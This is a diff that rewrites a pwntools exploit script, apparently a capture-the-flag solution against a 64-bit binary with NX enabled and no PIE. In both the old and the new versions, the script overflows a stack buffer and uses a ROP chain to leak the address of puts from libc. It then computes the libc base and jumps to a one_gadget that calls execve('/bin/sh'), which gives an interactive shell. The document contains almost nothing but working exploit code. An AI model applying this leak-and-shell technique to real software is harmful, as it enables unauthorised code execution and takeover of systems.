@@ -70,52 +70,37 @@ continue
 # NX:       NX enabled
 # PIE:      No PIE (0x400000)
 
-
-
-og1 = 0xe3afe 
-# execve("/bin/sh", r15, r12)
-# constraints:
-#   [r15] == NULL || r15 == NULL || r15 is a valid argv
-#   [r12] == NULL || r12 == NULL || r12 is a valid envp
-
-gift = 0x40119b
-
-pop_rdi_gadget = p64(0x4011a2)
-
-puts_got = p64(0x404000)
-puts_plt = p64(0x401030)
-main_plt = p64(0x401177)
-vuln_plt = p64(0x401136)
-puts_offset = 0x84420
-
-junk = b'a'*48 + b'a'*8
-payload = junk + pop_rdi_gadget + puts_got + puts_plt + vuln_plt
-
 io = start()
+one_gadget = 0xe3afe 
+gift_from_uncle_sam = 0x40119b
+puts_got = 0x404000
+puts_plt = 0x401030
+puts_offset = 0x84420
+pop_rdi_gadget = 0x4011a2
+vuln_address = 0x401136
+
+payload = b'A' * 48 + b'A' * 8
+payload += p64(pop_rdi_gadget)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(vuln_address)
+
 io.recv()
 io.sendline(payload)
-
-
+io.recvline()
 l1 = io.recvline()
-l2 = io.recvline()
-l3 = io.recvline()
+leaked_puts = u64(l1.ljust(8, b'\x00'))
+log.success("Leaked puts address: %s", hex(leaked_puts))
+libc_base = leaked_puts - puts_offset
+log.success("Libc base: %s", hex(libc_base))
+libc_base = libc_base - 0xa000000000000
+log.success("Fixed Libc base: %s", hex(libc_base))
+io.recv()
 
-leaked_puts = u64(l2.ljust(8, b'\x00'))
-leaked_puts -= 0xa000000000000
-log.success('Слитый адрес puts@GLIBC (./ret2plt): %s' % hex(leaked_puts))
-libc_start = leaked_puts - puts_offset
-
-p = b'a'*48
-p += b'a'*8
-p += p64(gift)
-
-p += p64(0x00)
-p += p64(0x00)
-p += p64(0x00)
-p += p64(0x00)
-
-p += p64(libc_start + og1)
-
-io.sendline(p)
-
+payload_two = b'A' * 48 + b'A' * 8
+payload_two += p64(gift_from_uncle_sam)
+payload_two += p64(0x00) + p64(0x00) + p64(0x00) + p64(0x00)
+payload_two += p64(libc_base + one_gadget)
+io.sendline(payload_two)
 io.interactive()
+
